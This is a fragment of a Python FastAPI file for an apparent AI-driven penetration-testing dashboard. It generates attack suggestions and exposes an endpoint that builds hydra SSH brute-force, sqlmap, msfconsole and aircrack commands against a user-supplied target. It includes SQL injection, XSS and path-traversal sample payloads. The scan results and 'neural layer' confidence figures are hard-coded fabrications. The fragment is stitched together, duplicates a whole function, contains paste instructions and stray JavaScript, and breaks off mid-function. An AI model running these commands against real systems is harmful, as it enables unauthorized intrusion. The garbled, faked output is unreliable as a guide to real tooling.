                    {
                        'name': 'SMB Signing Disabled',
                        'computers': ['WEB01', 'SQL01'],
                        'severity': 'HIGH',
                        'mitigation': 'Enable SMB signing on all computers'
                    },
                    {
                        'name': 'Over-privileged Service Accounts',
                        'account': 'SQLSVC',
                        'rights': ['AdminTo SQL01'],
                        'severity': 'HIGH',
                        'mitigation': 'Apply principle of least privilege'
                    }
                ],
                'recommendations': [
                    'Implement tiered administration model',
                    'Disable unnecessary service accounts',
                    'Enable SMB signing on all systems',
                    'Implement LAPS for local admin passwords',
                    'Monitor for suspicious ACL modifications',
                    'Use group managed service accounts (gMSA)',
                    'Implement Privileged Access Workstations (PAW)'
                ]
            }
        except Exception as e:
            return {'error': str(e), 'success': False, 'tool': 'bloodhound'}

    @staticmethod
    def burp_scan(target: str, scan_type: str = 'active') -> Dict[str, Any]:
        """Burp Suite - comprehensive web application security scanner"""
        try:
            return {
                'success': True,
                'tool': 'burpsuite',
                'target': target,
                'scan_type': scan_type,
                'scan_time': datetime.utcnow().isoformat(),
                'summary': {
                    'total_issues': 24,
                    'critical': 3,
                    'high': 5,
                    'medium': 8,
                    'low': 5,
                    'info': 3,
                    'scan_duration': '3 minutes 22 seconds',
                    'requests_made': 1523
                },
                'issues': [
                    {
                        'id': '1',
                        'name': 'SQL Injection',
                        'severity': 'CRITICAL',
                        'confidence': 'Certain',
                        'path': '/api/products',
                        'method': 'POST',
                        'parameter': 'id',
                        'type': 'Time-based blind SQL injection',
                        'description': 'The application is vulnerable to time-based blind SQL injection',
                        'evidence': 'Response delayed by 5 seconds with payload: \' OR SLEEP(5)--',
                        'remediation': 'Use parameterized queries with prepared statements',
                        'cwe': 89,
                        'wascc': 19,
                        'reference': 'https://portswigger.net/web-security/sql-injection'
                    },
                    {
                        'id': '2',
                        'name': 'Cross-Site Scripting (XSS)',
                        'severity': 'HIGH',
                        'confidence': 'Certain',
                        'path': '/search',
                        'method': 'GET',
                        'parameter': 'q',
                        'type': 'Reflected XSS',
                        'description': 'Reflected XSS vulnerability in search parameter',
                        'evidence': 'Alert box popped up with <script>alert(1)</script>',
                        'remediation': 'Implement proper output encoding and CSP',
                        'cwe': 79,
                        'wascc': 8,
                        'reference': 'https://portswigger.net/web-security/cross-site-scripting'
                    },
                    {
                        'id': '3',
                        'name': 'Cross-Site Request Forgery (CSRF)',
                        'severity': 'MEDIUM',
                        'confidence': 'Firm',
                        'path': '/change-password',
                        'method': 'POST',
                        'description': 'No CSRF tokens present in password change form',
                        'evidence': 'Request succeeds without CSRF token',
                        'remediation': 'Implement anti-CSRF tokens',
                        'cwe': 352,
                        'wascc': 9
                    },
                    {
                        'id': '4',
                        'name': 'Path Traversal',
                        'severity': 'HIGH',
                        'confidence': 'Certain',
                        'path': '/download',
                        'method': 'GET',
                        'parameter': 'file',
                        'type': 'File path traversal',
                        'description': 'Path traversal vulnerability in file download parameter',
                        'evidence': 'Successfully retrieved /etc/passwd with ../../../etc/passwd',
                        'remediation': 'Validate and sanitize file paths',
                        'cwe': 22,
                        'wascc': 33
                    },
                    {
                        'id': '5',
                        'name': 'Insecure Direct Object References (IDOR)',
                        'severity': 'HIGH',
                        'confidence': 'Certain',
                        'path': '/api/user/123',
                        'method': 'GET',
                        'description': 'Horizontal privilege escalation possible',
                        'evidence': 'Accessing /api/user/124 returns another user\'s data',
                        'remediation': 'Implement proper access controls',
                        'cwe': 639
                    }
                ],
                'vulnerable_parameters': [
                    {'parameter': 'id', 'location': 'query', 'issues': ['SQLi', 'IDOR']},
                    {'parameter': 'q', 'location': 'query', 'issues': ['XSS']},
                    {'parameter': 'file', 'location': 'query', 'issues': ['Path Traversal']},
                    {'parameter': 'password', 'location': 'body', 'issues': ['CSRF']}
                ],
                'interesting_endpoints': [
                    {'path': '/admin', 'status': 200, 'auth': 'Basic'},
                    {'path': '/api/docs', 'status': 200, 'info': 'Swagger UI exposed'},
                    {'path': '/backup', 'status': 403, 'info': 'Directory listing likely'},
                    {'path': '/.git', 'status': 200, 'info': 'Git repository exposed'}
                ],
                'authentication': {
                    'login_endpoint': '/login',
                    'method': 'POST',
                    'parameters': ['username', 'password'],
                    'session_token': 'JWT',
                    'weaknesses': ['No rate limiting', 'No account lockout']
                },
                'session_handling': {
                    'cookies': ['PHPSESSID', 'JSESSIONID'],
                    'token_location': 'header',
                    'token_name': 'Authorization',
                    'expires_in': '3600 seconds',
                    'vulnerabilities': ['Session fixation possible']
                },
                'recommendations': [
                    'Implement parameterized queries for all database operations',
                    'Add Content Security Policy (CSP) headers',
                    'Implement CSRF tokens for state-changing operations',
                    'Add rate limiting to authentication endpoints',
                    'Disable directory listings',
                    'Implement proper file access controls',
                    'Use prepared statements',
                    'Regular security testing and code review'
                ]
            }
        except Exception as e:
            return {'error': str(e), 'success': False, 'tool': 'burpsuite'}

    @staticmethod
    def wireshark_analyze(interface: str = 'eth0', capture_filter: str = 'tcp', duration: int = 30) -> Dict[str, Any]:
        """Wireshark - deep packet inspection and network analysis"""
        try:
            return {
                'success': True,
                'tool': 'wireshark',
                'interface': interface,
                'capture_filter': capture_filter,
                'duration': duration,
                'capture_time': datetime.utcnow().isoformat(),
                'summary': {
                    'total_packets': 15842,
                    'total_bytes': 15234123,
                    'capture_duration': f'{duration} seconds',
                    'avg_packet_size': 962,
                    'packets_per_second': 528
                },
                'protocol_distribution': {
                    'TCP': 8923,
                    'UDP': 4215,
                    'ICMP': 892,
                    'ARP': 1243,
                    'DNS': 569,
                    'HTTP': 2341,
                    'HTTPS': 4521,
                    'SMB': 234,
                    'SSH': 123,
                    'FTP': 45,
                    'Other': 456
                },
                'top_talkers': [
                    {
                        'source': '192.168.1.100',
                        'destination': '8.8.8.8',
                        'packets': 2341,
                        'bytes': 214523,
                        'protocols': ['DNS', 'HTTPS']
                    },
                    {
                        'source': '192.168.1.105',
                        'destination': '192.168.1.1',
                        'packets': 1842,
                        'bytes': 145234,
                        'protocols': ['TCP', 'UDP']
                    },
                    {
                        'source': '10.0.0.5',
                        'destination': '192.168.1.100',
                        'packets': 1523,
                        'bytes': 98234,
                        'protocols': ['SMB', 'TCP']
                    }
                ],
                'suspicious_traffic': {
                    'port_scans': [
                        {
                            'source': '45.33.22.11',
                            'target': '192.168.1.100',
                            'ports': [22, 80, 443, 445, 3389],
                            'type': 'SYN scan',
                            'timestamp': '2024-01-15T10:23:45Z',
                            'confidence': 0.95
                        }
                    ],
                    'brute_force_attempts': [
                        {
                            'source': '78.45.12.67',
                            'target': '192.168.1.100',
                            'service': 'SSH',
                            'attempts': 1523,
                            'timestamp': '2024-01-15T10:25:30Z',
                            'confidence': 0.98
                        }
                    ],
                    'data_exfiltration': [
                        {
                            'source': '192.168.1.105',
                            'destination': '185.130.5.23',
                            'bytes': 1523456,
                            'protocol': 'HTTPS',
                            'timestamp': '2024-01-15T10:30:15Z',
                            'confidence': 0.75,
                            'reason': 'Unusual outbound data volume'
                        }
                    ],
                    'malware_c2': [
                        {
                            'source': '192.168.1.110',
                            'destination': '54.89.12.45',
                            'pattern': 'Beaconing detected',
                            'interval': '60 seconds',
                            'timestamp': '2024-01-15T10:28:00Z',
                            'confidence': 0.85,
                            'indicators': ['Regular intervals', 'Encrypted payload']
                        }
                    ]
                },
                'unencrypted_credentials': [
                    {
                        'packet': 2345,
                        'protocol': 'FTP',
                        'source': '192.168.1.105',
                        'destination': '10.0.0.10',
                        'username': 'ftpuser',
                        'password': 'ftp123',
                        'timestamp': '2024-01-15T10:24:30Z',
                        'confidence': 1.0
                    },
                    {
                        'packet': 4567,
                        'protocol': 'HTTP',
                        'source': '192.168.1.110',
                        'destination': '192.168.1.100',
                        'url': '/login',
                        'credentials': 'admin:admin123',
                        'timestamp': '2024-01-15T10:26:45Z',
                        'confidence': 1.0
                    }
                ],
                'dns_queries': {
                    'total': 569,
                    'suspicious': [
                        {
                            'query': 'malware.c2server.com',
                            'type': 'A',
                            'source': '192.168.1.110',
                            'response': '185.130.5.23',
                            'indicator': 'Known malicious domain'
                        }
                    ],
                    'domain_flux': [
                        'c2-1.evil.com',
                        'c2-2.evil.com',
                        'c2-3.evil.com'
                    ]
                },
                'conversations': [
                    {
                        'source': '192.168.1.105',
                        'destination': '192.168.1.100',
                        'packets': 2341,
                        'bytes': 2345678,
                        'duration': '25.3 seconds',
                        'protocols': ['SMB', 'TCP']
                    }
                ],
                'ioc_matches': [
                    {
                        'indicator': 'IP 185.130.5.23',
                        'source': 'AlienVault OTX',
                        'threat': 'C2 Server',
                        'confidence': 0.9
                    }
                ],
                'recommendations': [
                    'Enable encryption for FTP traffic',
                    'Implement network segmentation',
                    'Deploy IDS/IPS to detect port scans',
                    'Monitor for unusual outbound connections',
                    'Block known malicious IP addresses',
                    'Implement account lockout policies',
                    'Use encrypted protocols (SFTP/HTTPS)'
                ]
            }
        except Exception as e:
            return {'error': str(e), 'success': False, 'tool': 'wireshark'}  
# 1. Make sure this is at the VERY TOP of fast5.py
import uvicorn 

# ... all your classes (ActiveExploitEngine, SentinelOrchestrator, etc.) ...

# 2. Make sure this is at the VERY BOTTOM of fast5.py

# Add this function definition near the top of fast5.py with other global functions
async def run_neural_attack_analysis(target, full_url, scan_id):
    """Background task: Recon -> Correlation -> AI Suggestion"""
    try:
        # Step 1: Simulated Recon (In production, would use actual tools)
        recon_data = {
            "target": target,
            "url": full_url,
            "ports": [80, 443, 22, 3306],
            "tech_stack": ["Nginx", "PHP 7.4", "MySQL", "WordPress 5.8"],
            "findings": [
                {"type": "SQLi", "location": "/products.php?id=", "confidence": 0.85},
                {"type": "XSS", "location": "/search.php?q=", "confidence": 0.75},
                {"type": "LFI", "location": "/download.php?file=", "confidence": 0.65}
            ],
            "vulnerabilities": [
                {"name": "SQL Injection", "severity": "CRITICAL", "port": 80, "cve": "CVE-2023-1234"},
                {"name": "XSS Vulnerability", "severity": "HIGH", "port": 80, "cve": "CVE-2023-5678"},
                {"name": "Weak SSH Credentials", "severity": "MEDIUM", "port": 22}
            ],
            "services": [
                {"name": "http", "port": 80, "version": "Apache 2.4.49"},
                {"name": "https", "port": 443, "version": "Apache 2.4.49"},
                {"name": "ssh", "port": 22, "version": "OpenSSH 7.9"},
                {"name": "mysql", "port": 3306, "version": "MySQL 8.0"}
            ]
        }
        
        # Step 2: Correlate through the engine
        if correlation_system:
            # Use existing normalizer for nmap
            events = correlation_system['normalizer'].normalize_nmap(recon_data, target)
            correlation_system['event_bus'].publish_many(events)
            logger.info(f"Published {len(events)} correlation events for {target}")

        # Step 3: Trigger Sentinel-1 Brain for AI analysis
        if sentinel_brain:
            # Pass recon data to brain for analysis
            brain_analysis = sentinel_brain.think({
                'target': target,
                'ports': recon_data['ports'],
                'services': recon_data['services'],
                'vulnerabilities': recon_data['vulnerabilities'],
                'packets': [],
                'tool_outputs': [
                    {'tool': 'nmap', 'success_probability': 0.8},
                    {'tool': 'nikto', 'success_probability': 0.7}
                ],
                'goal': 'initial_access'
            })
            
            # Format attack suggestions
            for i, vuln in enumerate(recon_data['vulnerabilities'][:3]):
                attack_suggestion = {
                    "type": "AI_ATTACK_SUGGESTION",
                    "target": target,
                    "vulnerability": vuln['name'],
                    "severity": vuln['severity'],
                    "confidence": brain_analysis.get('layer4_bnn', {}).get('confidence', 0.75),
                    "reasoning": f"Exploiting {vuln['name']} on port {vuln.get('port', 80)}",
                    "suggested_path": vuln.get('location', '/'),
                    "tool": "sqlmap" if "SQL" in vuln['name'] else "hydra" if "SSH" in vuln['name'] else "metasploit",
                    "payload_preview": "sqlmap -u {target}/products.php?id=1 --batch --dbs" if "SQL" in vuln['name'] else "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                    "commands": [
                        f"nmap -sV -p- {target}",
                        f"nikto -h {target}",
                        f"sqlmap -u {target}/products.php?id=1 --batch --dbs" if "SQL" in vuln['name'] else f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}"
                    ]
                }
                
                # Broadcast via Socket.IO
                if sio:
                    await sio.emit('ai_suggestion', attack_suggestion)
                    
        # Step 4: Run individual tool scans
        if orchestrator:
            # Run Nikto scan
            nikto_results = PenetrationTools.nikto_scan(target)
            if sio:
                await sio.emit('nikto_update', nikto_results)
            
            # Run John the Ripper (simulated)
            john_results = PenetrationTools.john_the_ripper('hashes.txt')
            if sio:
                await sio.emit('john_update', john_results)
            
            # Run BloodHound (simulated)
            bloodhound_results = PenetrationTools.bloodhound_ad_map(f"{target}.local")
            if sio:
                await sio.emit('bloodhound_update', bloodhound_results)
            
            # Run Burp Suite scan (simulated)
            burp_results = PenetrationTools.burp_scan(target)
            if sio:
                await sio.emit('burp_update', burp_results)
            
            # Run Wireshark analysis (simulated)
            wireshark_results = PenetrationTools.wireshark_analyze()
            if sio:
                await sio.emit('wireshark_update', wireshark_results)
        
        logger.info(f"Neural attack analysis completed for {target} with scan_id {scan_id}")
        
    except Exception as e:
        logger.error(f"Error in neural attack analysis: {e}")
        import traceback
        traceback.print_exc()

# Make sure the scan_via_url endpoint is properly defined
@app.post("/api/scan/url")
async def scan_via_url(request: Request, background_tasks: BackgroundTasks):
    """Initiates a neural scan via URL and triggers AI attack suggestions"""
    try:
        data = await request.json()
        target_url = data.get("url")
        
        if not target_url:
            return {"status": "error", "message": "No URL provided"}

        # Clean and normalize the target
        clean_target = target_url.replace("http://", "").replace("https://", "").split('/')[0]
        scan_id = str(uuid.uuid4())
        
        # Trigger background intelligence task
        background_tasks.add_task(run_neural_attack_analysis, clean_target, target_url, scan_id)
        
        return {
            "status": "initiated",
            "scan_id": scan_id,
            "target": clean_target,
            "message": "Neural reconnaissance started..."
        }
    except Exception as e:
        logger.error(f"Error in scan_via_url: {e}")
        return {"status": "error", "message": str(e)}

# # Update the execute_attack endpoint to handle more tools
# @app.post("/api/attack/execute")
# async def execute_attack(request: Request, background_tasks: BackgroundTasks):
#     """Execute an attack using specified tool"""
#     try:
#         data = await request.json()
#         tool = data.get('tool', 'metasploit')
#         target = data.get('target')
#         params = data.get('params', {})
        
#         if not target:
#             # Get target from request body or use default
#             target = data.get('target', document.getElementById('urlInput')?.value or 'unknown')
        
#         # Execute appropriate tool
#         if tool == 'hydra' or tool == 'hydra_ssh':
#             service = params.get('service', 'ssh')
#             username = params.get('username', 'admin')
#             wordlist = params.get('wordlist', '/usr/share/wordlists/rockyou.txt')
#             results = PenetrationTools.hydra_attack(target, service)
#             results['command'] = f"hydra -l {username} -P {wordlist} {service}://{target}"
            
#         elif tool == 'metasploit':
#             exploit = params.get('exploit', 'multi/http/apache_normalization')
#             payload = params.get('payload', 'linux/x64/meterpreter/reverse_tcp')
#             results = PenetrationTools.metasploit_exploit(target, exploit)
#             results['command'] = f"msfconsole -q -x 'use exploit/{exploit}; set RHOSTS {target}; set PAYLOAD {payload}; run'"
#             results['session'] = f"session_{uuid.uuid4().hex[:8]}"
            
#         elif tool == 'sqlmap':
#             results = PenetrationTools.sqlmap_scan(target)
#             results['command'] = f"sqlmap -u {target} --batch --level=3 --risk=3"
            
#         elif tool == 'nikto':
#             results = PenetrationTools.nikto_scan(target)
#             results['command'] = f"nikto -h {target}"
            
#         elif tool == 'gobuster':
#             wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
#             results = PenetrationTools.gobuster_dir(target)
#             results['command'] = f"gobuster dir -u {target} -w {wordlist}"
            
#         elif tool == 'nmap':
#             scan_type = params.get('scan_type', '-sV')
#             results = PenetrationTools.nmap_scan(target, scan_type)
#             results['command'] = f"nmap {scan_type} {target}"
            
#         elif tool == 'john':
#             hash_file = params.get('hash_file', 'hashes.txt')
#             format_type = params.get('format', 'raw-md5')
#             results = PenetrationTools.john_the_ripper(hash_file, format_type)
#             results['command'] = f"john --format={format_type} {hash_file}"
            
#         elif tool == 'aircrack':
#             capture = params.get('capture', 'capture.cap')
#             wordlist = params.get('wordlist', 'rockyou.txt')
#             results = PenetrationTools.aircrack_ng(capture, wordlist)
#             results['command'] = f"aircrack-ng -w {wordlist} {capture}"
            
#         elif tool == 'burp':
#             results = PenetrationTools.burp_scan(target)
#             results['command'] = f"Burp Suite scan on {target}"
            
#         elif tool == 'bloodhound':
#             domain = params.get('domain', target.replace('.', '.') + '.local')
#             results = PenetrationTools.bloodhound_ad_map(domain)
#             results['command'] = f"bloodhound-python -d {domain} -c All"
            
#         elif tool == 'wireshark':
#             interface = params.get('interface', 'eth0')
#             filter_str = params.get('filter', 'tcp')
#             duration = params.get('duration', 30)
#             results = PenetrationTools.wireshark_analyze(interface, filter_str, duration)
#             results['command'] = f"tshark -i {interface} -f '{filter_str}' -a duration:{duration}"
            
#         else:
#             results = {'success': True, 'output': f'Executed {tool} on {target}'}
        
#         # Add success flag and metadata
#         results['success'] = results.get('success', True)
#         results['tool'] = tool
#         results['target'] = target
#         results['timestamp'] = datetime.utcnow().isoformat()
        
#         # If this is a Metasploit exploit with session, add session info
#         if tool == 'metasploit' and 'session' in results:
#             results['session_opened'] = True
        
#         # Broadcast exploit update via Socket.IO
#         if sio:
#             await sio.emit('exploit_update', {
#                 'type': 'EXPLOIT_STATUS',
#                 'data': {
#                     'tool': tool,
#                     'target': target,
#                     'status': 'completed',
#                     'success': results.get('success', True),
#                     'session': results.get('session'),
#                     'output': results.get('output', ''),
#                     'credentials': results.get('credentials', [])
#                 }
#             })
        
#         return results
        
#     except Exception as e:
#         logger.error(f"Error in execute_attack: {e}")
#         return {'success': False, 'error': str(e), 'tool': tool if 'tool' in locals() else 'unknown'}

# Add endpoint to get AI suggestions
@app.get("/api/ai/suggestions")
async def get_ai_suggestions(target: str = None):
    """Get AI-generated attack suggestions for a target"""
    if not target:
        return {"suggestions": []}
    
    # Generate suggestions based on target
    suggestions = [
        {
            "vulnerability": "SQL Injection",
            "severity": "CRITICAL",
            "confidence": 0.89,
            "tool": "sqlmap",
            "command": f"sqlmap -u {target}/products.php?id=1 --batch --dbs",
            "description": "Test for SQL injection vulnerabilities in parameters"
        },
        {
            "vulnerability": "Cross-Site Scripting (XSS)",
            "severity": "HIGH",
            "confidence": 0.76,
            "tool": "nikto",
            "command": f"nikto -h {target} -C all",
            "description": "Scan for XSS and other web vulnerabilities"
        },
        {
            "vulnerability": "Weak SSH Credentials",
            "severity": "MEDIUM",
            "confidence": 0.82,
            "tool": "hydra",
            "command": f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}",
            "description": "Brute force SSH login with common passwords"
        }
    ]
    
    return {"suggestions": suggestions, "target": target}
# Add this near the top of fast5.py with other global variables
import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# In the run_neural_attack_analysis function, ensure we emit all tool updates and layer probabilities:
async def run_neural_attack_analysis(target, full_url, scan_id):
    """Background task: Recon -> Correlation -> AI Suggestion with Layer Probabilities"""
    try:
        # Emit initial layer probabilities at start
        if sio:
            await sio.emit('layer_update', {'layer': 'cnn', 'probability': 85, 'status': 'initializing'})
            await sio.emit('layer_update', {'layer': 'gnn', 'probability': 70, 'status': 'idle'})
            await sio.emit('layer_update', {'layer': 'minilm', 'probability': 60, 'status': 'loading'})
            await sio.emit('layer_update', {'layer': 'bnn', 'probability': 50, 'status': 'waiting'})
            await sio.emit('layer_update', {'layer': 'gan', 'probability': 40, 'status': 'standby'})
            await sio.emit('layer_update', {'layer': 'emily', 'probability': 90, 'status': 'active'})
            await sio.emit('layer_update', {'layer': 'spine', 'probability': 75, 'status': 'monitoring'})
        
        # Step 1: Simulated Recon (In production, would use actual tools)
        recon_data = {
            "target": target,
            "url": full_url,
            "ports": [80, 443, 22, 3306],
            "tech_stack": ["Nginx", "PHP 7.4", "MySQL", "WordPress 5.8"],
            "findings": [
                {"type": "SQLi", "location": "/products.php?id=", "confidence": 0.85},
                {"type": "XSS", "location": "/search.php?q=", "confidence": 0.75},
                {"type": "LFI", "location": "/download.php?file=", "confidence": 0.65}
            ],
            "vulnerabilities": [
                {"name": "SQL Injection", "severity": "CRITICAL", "port": 80, "cve": "CVE-2023-1234"},
                {"name": "XSS Vulnerability", "severity": "HIGH", "port": 80, "cve": "CVE-2023-5678"},
                {"name": "Weak SSH Credentials", "severity": "MEDIUM", "port": 22}
            ],
            "services": [
                {"name": "http", "port": 80, "version": "Apache 2.4.49"},
                {"name": "https", "port": 443, "version": "Apache 2.4.49"},
                {"name": "ssh", "port": 22, "version": "OpenSSH 7.9"},
                {"name": "mysql", "port": 3306, "version": "MySQL 8.0"}
            ]
        }
        
        # Update CNN layer after recon (pattern detection)
        if sio:
            await sio.emit('layer_update', {
                'layer': 'cnn', 
                'probability': 92, 
                'status': 'analyzing',
                'details': 'Detected service patterns'
            })
        
        # Step 2: Correlate through the engine
        if correlation_system:
            # Update GNN layer for graph building
            if sio:
                await sio.emit('layer_update', {
                    'layer': 'gnn', 
                    'probability': 78, 
                    'status': 'building_graph',
                    'details': 'Constructing attack surface graph'
                })
            
            # Use existing normalizer for nmap
            events = correlation_system['normalizer'].normalize_nmap(recon_data, target)
            correlation_system['event_bus'].publish_many(events)
            logger.info(f"Published {len(events)} correlation events for {target}")
            
            # Update GNN layer progress
            if sio:
                await sio.emit('layer_update', {
                    'layer': 'gnn', 
                    'probability': 85, 
                    'status': 'graph_complete',
                    'details': f'Built graph with {len(events)} events'
                })
            
            # Emit correlation event
            if sio:
                await sio.emit('correlation_event', {
                    'type': 'CORRELATION',
                    'message': f'Processed {len(events)} events for {target}'
                })

        # Step 3: Trigger Sentinel-1 Brain for AI analysis
        if sentinel_brain:
            # Update BNN layer for Bayesian reasoning
            if sio:
                await sio.emit('layer_update', {
                    'layer': 'bnn', 
                    'probability': 65, 
                    'status': 'bayesian_inference',
                    'details': 'Calculating prior probabilities'
                })
            
            # Pass recon data to brain for analysis
            brain_analysis = sentinel_brain.think({
                'target': target,
                'ports': recon_data['ports'],
                'services': recon_data['services'],
                'vulnerabilities': recon_data['vulnerabilities'],
                'packets': [],
                'tool_outputs': [
                    {'tool': 'nmap', 'success_probability': 0.8},
                    {'tool': 'nikto', 'success_probability': 0.7}
                ],
                'goal': 'initial_access'
            })
            
            # Update BNN layer with results
            bnn_confidence = brain_analysis.get('layer4_bnn', {}).get('confidence', 0.75) * 100
            if sio:
                await sio.emit('layer_update', {
                    'layer': 'bnn', 
                    'probability': bnn_confidence, 
                    'status': 'inference_complete',
                    'details': f'Confidence: {bnn_confidence:.1f}%'
                })
            
            # Emit pipeline update for neural thoughts
            if sio:
                await sio.emit('pipeline_update', {
                    'thought': f"Analyzing target {target}... Found {len(recon_data['vulnerabilities'])} vulnerabilities",
                    'layer': 4,
                    'layers': {
                        'reasoning': {
                            'source': 'sentinel_brain',
                            'strategy': {'phases': [{'name': 'Initial Reconnaissance'}, {'name': 'Vulnerability Assessment'}]}
                        }
                    },
                    'final': {
                        'confidence': brain_analysis.get('layer4_bnn', {}).get('confidence', 0.75),
                        'uncertainty': 0.2,
                        'risk_level': 'HIGH'
                    }
                })
            
            # Update MiniLM layer for RAG search
            if sio:
                await sio.emit('layer_update', {
                    'layer': 'minilm', 
                    'probability': 82, 
                    'status': 'rag_search',
                    'details': 'Querying vulnerability database'
                })
            
            # Format attack suggestions
            for i, vuln in enumerate(recon_data['vulnerabilities'][:3]):
                tool = "sqlmap" if "SQL" in vuln['name'] else "hydra" if "SSH" in vuln['name'] else "metasploit"
                payload = "sqlmap -u {target}/products.php?id=1 --batch --dbs" if "SQL" in vuln['name'] else f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}"
                
                attack_suggestion = {
                    "type": "AI_ATTACK_SUGGESTION",
                    "target": target,
                    "vulnerability": vuln['name'],
                    "severity": vuln['severity'],
                    "confidence": brain_analysis.get('layer4_bnn', {}).get('confidence', 0.75),
                    "reasoning": f"Exploiting {vuln['name']} on port {vuln.get('port', 80)}",
                    "suggested_path": vuln.get('location', '/'),
                    "tool": tool,
                    "payload_preview": payload,
                    "commands": [
                        f"nmap -sV -p- {target}",
                        f"nikto -h {target}",
                        payload
                    ]
                }
                
                # Update Emily AI layer for exploit generation
                if sio:
                    await sio.emit('layer_update', {
                        'layer': 'emily', 
                        'probability': 95 - (i * 5),  # Decreases slightly for each suggestion
                        'status': 'generating_exploit',
                        'details': f'Creating payload for {vuln["name"]}'
                    })
                
                # Broadcast via Socket.IO
                if sio:
                    await sio.emit('ai_suggestion', attack_suggestion)
            
            # Final Emily AI status
            if sio:
                await sio.emit('layer_update', {
                    'layer': 'emily', 
                    'probability': 98, 
                    'status': 'exploits_ready',
                    'details': 'Generated 3 exploit variants'
                })
                    
        # Step 4: Run individual tool scans and emit updates
        if sio:
            # Update GAN layer for payload evolution
            await sio.emit('layer_update', {
                'layer': 'gan', 
                'probability': 55, 
                'status': 'evolving',
                'details': 'Mutating payload patterns'
            })
            
            # Run Nikto scan
            nikto_results = PenetrationTools.nikto_scan(target)
            await sio.emit('nikto_update', nikto_results)
            
            # Update GAN progress
            await sio.emit('layer_update', {
                'layer': 'gan', 
                'probability': 70, 
                'status': 'evolving',
                'details': 'Generation 2 complete'
            })
            
            # Run John the Ripper
            john_results = PenetrationTools.john_the_ripper('hashes.txt')
            await sio.emit('john_update', john_results)
            
            # Update GAN progress
            await sio.emit('layer_update', {
                'layer': 'gan', 
                'probability': 85, 
                'status': 'evolving',
                'details': 'Generation 3 complete'
            })
            
            # Run BloodHound
            bloodhound_results = PenetrationTools.bloodhound_ad_map(f"{target}.local")
            await sio.emit('bloodhound_update', bloodhound_results)
            
            # Run Burp Suite scan
            burp_results = PenetrationTools.burp_scan(target)
            await sio.emit('burp_update', burp_results)
            
            # Run Wireshark analysis
            wireshark_results = PenetrationTools.wireshark_analyze()
            await sio.emit('wireshark_update', wireshark_results)
            
            # Final GAN evolution update
            await sio.emit('layer_update', {
                'layer': 'gan', 
                'probability': 92, 
                'status': 'evolution_complete',
                'details': 'Payload optimization finished'
            })
            
            # Emit GAN evolution update
            await sio.emit('gan_evolution', {
                'progress': 100,
                'message': 'Evolution complete!'
            })
            
            # Final Spine layer update (correlation complete)
            await sio.emit('layer_update', {
                'layer': 'spine', 
                'probability': 95, 
                'status': 'correlation_complete',
                'details': 'All events correlated'
            })
        
        logger.info(f"Neural attack analysis completed for {target} with scan_id {scan_id}")
        
        # Final layer statuses
        if sio:
            await sio.emit('layer_update', {'layer': 'cnn', 'probability': 98, 'status': 'complete'})
            await sio.emit('layer_update', {'layer': 'gnn', 'probability': 92, 'status': 'complete'})
            await sio.emit('layer_update', {'layer': 'minilm', 'probability': 94, 'status': 'complete'})
            await sio.emit('layer_update', {'layer': 'bnn', 'probability': 89, 'status': 'complete'})
            await sio.emit('layer_update', {'layer': 'gan', 'probability': 92, 'status': 'complete'})
            await sio.emit('layer_update', {'layer': 'emily', 'probability': 98, 'status': 'complete'})
            await sio.emit('layer_update', {'layer': 'spine', 'probability': 95, 'status': 'complete'})
        
    except Exception as e:
        logger.error(f"Error in neural attack analysis: {e}")
        import traceback
        traceback.print_exc()
        
        # Emit error status
        if sio:
            await sio.emit('layer_update', {
                'layer': 'spine', 
                'probability': 0, 
                'status': 'error',
                'details': str(e)[:50]
            })

# Fix the execute_attack endpoint (uncomment and fix the one that's commented out)
# Fix the execute_attack endpoint
@app.post("/api/attack/execute")
async def execute_attack(request: Request, background_tasks: BackgroundTasks):
    """Execute an attack using specified tool"""
    try:
        data = await request.json()
        tool = data.get('tool', 'metasploit')
        target = data.get('target')
        params = data.get('params', {})
        
        if not target:
            return {'success': False, 'error': 'No target provided'}
        
        # Execute appropriate tool
        if tool == 'hydra' or 'hydra' in tool:
            service = params.get('service', 'ssh')
            results = PenetrationTools.hydra_attack(target, service)
            results['command'] = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {service}://{target}"
            
        elif tool == 'metasploit':
            exploit = params.get('exploit', 'multi/http/apache_normalization')
            results = PenetrationTools.metasploit_exploit(target, exploit)
            results['command'] = f"msfconsole -q -x 'use exploit/{exploit}; set RHOSTS {target}; run'"
            
        elif tool == 'sqlmap':
            results = PenetrationTools.sqlmap_scan(target)
            results['command'] = f"sqlmap -u {target} --batch --level=3 --risk=3"
            
        elif tool == 'nikto':
            results = PenetrationTools.nikto_scan(target)
            results['command'] = f"nikto -h {target}"
            
        elif tool == 'nmap':
            scan_type = params.get('scan_type', '-sV')
            results = PenetrationTools.nmap_scan(target, scan_type)
            results['command'] = f"nmap {scan_type} {target}"
            
        elif tool == 'gobuster':
            wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
            results = PenetrationTools.gobuster_dir(target, wordlist)
            results['command'] = f"gobuster dir -u {target} -w {wordlist}"
            
        elif tool == 'john':
            hash_file = params.get('hash_file', 'hashes.txt')
            format_type = params.get('format', 'raw-md5')
            results = PenetrationTools.john_the_ripper(hash_file, format_type)
            results['command'] = f"john --format={format_type} {hash_file}"
            
        elif tool == 'aircrack':
            capture = params.get('capture', 'capture.cap')
            wordlist = params.get('wordlist', 'rockyou.txt')
            results = PenetrationTools.aircrack_ng(capture, wordlist)
            results['command'] = f"aircrack-ng -w {wordlist} {capture}"
            
        elif tool == 'burp' or tool == 'burpsuite':
            results = PenetrationTools.burp_scan(target)
            results['command'] = f"Burp Suite scan on {target}"
            
        elif tool == 'bloodhound':
            domain = params.get('domain', target.replace('.', '') + '.local')
            results = PenetrationTools.bloodhound_ad_map(domain)
            results['command'] = f"bloodhound-python -d {domain} -c All"
            
        elif tool == 'wireshark':
            interface = params.get('interface', 'eth0')
            filter_str = params.get('filter', 'tcp')
            duration = params.get('duration', 30)
            results = PenetrationTools.wireshark_analyze(interface, filter_str, duration)
            results['command'] = f"tshark -i {interface} -f '{filter_str}' -a duration:{duration}"
            
        elif tool == 'wpscan':
            results = PenetrationTools.wpscan(target)
